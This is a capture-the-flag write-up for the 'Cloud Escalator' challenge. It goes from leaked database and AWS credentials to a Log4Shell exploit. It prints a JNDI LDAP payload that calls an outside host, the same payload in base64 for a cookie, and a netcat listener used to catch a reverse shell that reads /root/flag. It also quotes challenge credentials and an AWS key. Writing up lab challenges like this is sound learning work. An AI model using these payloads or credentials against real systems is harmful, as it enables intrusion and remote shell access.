# Cloud Escalator Part 1, 300 points

## Flag 1 - 25 points

I started by poking around the site for leads.

I found a `/login` page as well as a `/forgotpassword.html` page, and in the source code of this page we find:

> // Complete the connection to mysqldb escalator.c45luksaam7a.us-east-1.rds.amazonaws.com. Use credential allen:8%pZ-s^Z+P4d=h@P

So I tried to connect to the mysql db with the command `mysql -u allen -h escalator.c45luksaam7a.us-east-1.rds.amazonaws.com -p`

To navigate through the different db's, we need to do `show databases;` | `use 'db';` | `show tables;` | `show tables;` | `select * from 'table';`

And in the users db, we find the data table which contains :

**Flag 1: CTF{!_p@wn3d_db_4_fu9}**

## Flag 2 - 50 points

Digging in the db, we also find a key aws (`AKIAWSXCCGNYFS7NN2XU | m6zD41qMXR4KlcyjXAIxdYrDm0YczPIiyi1p9P0I`)

I used this [write up](https://github.com/piyagehi/CTF-Writeups/blob/main/2021-Space-Race/1-Locked-Out.md) to find the second flag.

I installed aws-client and was able to download the file `Logs.txt`.

In this one we have the second flag,

**Flag 2: CTF{S3eing_T3r0ugh_!t}**

## Flag 3 - 75 points

In the mysql db, there was also an openssh private key in the git table, and there is mention of a github repository in `Logs.txt` (github.com/cloudhopper-sec/app.git).

So I used [this tutorial](https://superuser.com/questions/232373/how-to-tell-git-which-private-key-to-use) to clone a github repository while using an openssh private key.

`git clone git@github.com:cloudhopper-sec/app.git`

And then I searched in the files for the flag.

Here are two unassigned variables in the CookieHandler.java file:

![](./1.png)

So I said to myself that they were assigned in a previous commit.

(to list all the commits, `git log` and to switch from one commit to another, `git checkout 'commit hash'`)

And if you look through the previous commits, you will find :

![](./2.png)

Tada! We can then connect to the site to get our flag:

![](./3.png)

**Flag 3: CTF{Y0u_G0t_A_l3ak}**

## Flag 4 - 150 points

And this is where the problems start. 

![](./4.png)

This is the log4j java library. If you don't know it, you should know that thanks to it an attacker is able to get a shell without too much difficulty.

For that, the user's input must be read by this library. The only place where this is the case in all these files is here:

![](./5.png)

On the `profile` page (accessible when logged in), the program checks if there is a debug cookie and if so, reads its content in base64.

I started by testing the vulnerability with the [log4shell.tools](https://log4shell.tools) site.

My test exploit:

`${jndi:ldap://e61de143-90b5-4a8d-afb5-eea3c5b75db9.dns.log4shell.tools:12345/e61de143-90b5-4a8d-afb5-eea3c5b75db9}`

Into base 64:

`JHtqbmRpOmxkYXA6Ly9lNjFkZTE0My05MGI1LTRhOGQtYWZiNS1lZWEzYzViNzVkYjkuZG5zLmxvZzRzaGVsbC50b29sczoxMjM0NS9lNjFkZTE0My05MGI1LTRhOGQtYWZiNS1lZWEzYzViNzVkYjl9`

Into 'debug' cookie :

![](./6.png)

The site detects a request, which makes it a Log4Shell vulnerability discovery!

So I used this fantastic [tool](https://github.com/kozmer/log4j-shell-poc), ran an `nc -lnvp 9001` and boom!

We get a shell !

![](./7.png)

so I did :

`ls /`

`ls /root`

`cat /root/flag`

![](./8.png)

**Flag 4: CTF{H3aT_th3_L0GF0rg3}**

Thanks for reading!